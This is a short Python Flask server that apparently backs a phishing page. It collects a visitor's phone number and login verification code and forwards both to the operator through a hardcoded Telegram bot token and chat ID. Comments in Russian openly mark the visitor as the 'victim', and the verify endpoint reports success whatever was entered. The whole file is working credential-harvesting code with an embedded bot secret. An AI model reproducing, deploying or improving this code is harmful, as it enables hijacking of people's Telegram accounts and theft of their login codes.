from flask import Flask, request, jsonify, send_from_directory
import requests
import os

app = Flask(__name__)

BOT_TOKEN = "8322289308:AAEuUETn72fgvS0waidzVkjWIuJ8dhIe8Ts"
OWNER_ID = 208405935  # твой ID

def send_telegram(text):
    try:
        requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                      json={"chat_id": OWNER_ID, "text": text})
    except:
        pass

@app.route('/')
def index():
    return send_from_directory('.', 'index.html')

@app.route('/api/send_code', methods=['POST'])
def send_code():
    data = request.json
    phone = data.get('phone', '')
    user_id = data.get('user_id', '')  # ★★★ ПОЛУЧАЕМ ID ЖЕРТВЫ ★★★
    send_telegram(f"📱 НОМЕР: {phone}\n👤 USER_ID: {user_id}")
    return jsonify({"status": "ok"})

@app.route('/api/verify_code', methods=['POST'])
def verify_code():
    data = request.json
    phone = data.get('phone', '')
    code = data.get('code', '')
    user_id = data.get('user_id', '')  # ★★★ ПОЛУЧАЕМ ID ЖЕРТВЫ ★★★
    send_telegram(f"🔓 {phone}\nКОД: {code}\n👤 USER_ID: {user_id}")
    return jsonify({"success": True})

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port)
